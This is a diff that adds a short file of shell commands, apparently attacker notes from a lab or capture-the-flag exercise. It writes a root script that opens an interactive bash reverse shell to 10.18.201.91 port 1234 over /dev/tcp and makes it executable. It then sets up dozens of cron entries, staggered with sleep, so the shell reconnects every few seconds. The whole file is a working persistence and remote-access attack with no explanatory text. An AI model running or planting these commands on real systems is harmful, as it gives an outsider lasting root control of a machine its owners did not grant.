@@ -1,0 +1,60 @@
+echo '#!/bin/bash' > /root/reverse_shell.sh
+echo 'bash -i >& /dev/tcp/10.18.201.91/1234 0>&1' >> /root/reverse_shell.sh
+chmod +x /root/reverse_shell.sh
+
+
+
+crontab -e
+
+
+
+
+* * * * * /root/reverse_shell.sh
+* * * * * sleep 5; /root/reverse_shell.sh
+* * * * * sleep 10; /root/reverse_shell.sh
+* * * * * sleep 15; /root/reverse_shell.sh
+* * * * * sleep 20; /root/reverse_shell.sh
+* * * * * sleep 25; /root/reverse_shell.sh
+* * * * * sleep 30; /root/reverse_shell.sh
+* * * * * sleep 35; /root/reverse_shell.sh
+* * * * * sleep 40; /root/reverse_shell.sh
+* * * * * sleep 45; /root/reverse_shell.sh
+* * * * * sleep 50; /root/reverse_shell.sh
+* * * * * sleep 55; /root/reverse_shell.sh
+
+
+
+
+
+
+
+* * * * * /root/reverse_shell.sh
+* * * * * sleep 2; /root/reverse_shell.sh
+* * * * * sleep 4; /root/reverse_shell.sh
+* * * * * sleep 6; /root/reverse_shell.sh
+* * * * * sleep 8; /root/reverse_shell.sh
+* * * * * sleep 10; /root/reverse_shell.sh
+* * * * * sleep 12; /root/reverse_shell.sh
+* * * * * sleep 14; /root/reverse_shell.sh
+* * * * * sleep 16; /root/reverse_shell.sh
+* * * * * sleep 18; /root/reverse_shell.sh
+* * * * * sleep 20; /root/reverse_shell.sh
+* * * * * sleep 22; /root/reverse_shell.sh
+* * * * * sleep 24; /root/reverse_shell.sh
+* * * * * sleep 26; /root/reverse_shell.sh
+* * * * * sleep 28; /root/reverse_shell.sh
+* * * * * sleep 30; /root/reverse_shell.sh
+* * * * * sleep 32; /root/reverse_shell.sh
+* * * * * sleep 34; /root/reverse_shell.sh
+* * * * * sleep 36; /root/reverse_shell.sh
+* * * * * sleep 38; /root/reverse_shell.sh
+* * * * * sleep 40; /root/reverse_shell.sh
+* * * * * sleep 42; /root/reverse_shell.sh
+* * * * * sleep 44; /root/reverse_shell.sh
+* * * * * sleep 46; /root/reverse_shell.sh
+* * * * * sleep 48; /root/reverse_shell.sh
+* * * * * sleep 50; /root/reverse_shell.sh
+* * * * * sleep 52; /root/reverse_shell.sh
+* * * * * sleep 54; /root/reverse_shell.sh
+* * * * * sleep 56; /root/reverse_shell.sh
+* * * * * sleep 58; /root/reverse_shell.sh
